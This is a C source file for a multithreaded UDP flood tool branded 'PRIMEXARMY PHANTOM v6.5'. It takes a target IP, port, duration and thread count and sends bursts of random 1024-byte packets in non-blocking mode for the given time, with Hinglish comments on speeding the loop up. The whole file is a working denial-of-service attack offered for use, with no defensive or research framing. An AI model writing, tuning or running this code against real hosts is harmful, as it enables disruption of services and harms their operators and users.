#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

/* ⚔️ PRIMEXARMY v6.5 - PHANTOM EXTREME (Optimized for 18 Nodes) ⚔️ */

struct thread_data {
    char ip[16];
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    
    // UDP Socket creation
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // ✨ PERFORMANCE FIX: Non-blocking mode
    fcntl(sock, F_SETFL, O_NONBLOCK);

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    // Optimized Payload (Junk Data)
    char payload[1024];
    for (int i = 0; i < 1024; i++) payload[i] = (char)(rand() % 255);

    time_t end_time = time(NULL) + data->duration;
    
    // 🚀 ULTRA-FAST LOOP: Sabse kam checks
    while (time(NULL) < end_time) {
        // Ek baar mein multiple packets bhejo bina loop break kiye
        for (int i = 0; i < 100; i++) {
            sendto(sock, payload, 1024, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗣𝗛𝗔𝗡𝗧𝗢𝗠 𝘃𝟲.𝟱  ⚔️\n");
        printf("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
        return 1;
    }

    struct thread_data data;
    strncpy(data.ip, argv[1], 15);
    data.port = atoi(argv[2]);
    data.duration = atoi(argv[3]);
    int threads_count = atoi(argv[4]);

    pthread_t *thread_id = malloc(threads_count * sizeof(pthread_t));
    srand(time(NULL));

    printf("🚀 [PHANTOM v6.5] Target: %s:%d | Nodes: 6 | Threads: %d\n", data.ip, data.port, threads_count);

    for (int i = 0; i < threads_count; i++) {
        pthread_create(&thread_id[i], NULL, prime_strike, (void *)&data);
    }

    for (int i = 0; i < threads_count; i++) {
        pthread_join(thread_id[i], NULL);
    }

    free(thread_id);
    printf("✅ [FINISHED] Strike Complete.\n");
    return 0;
}
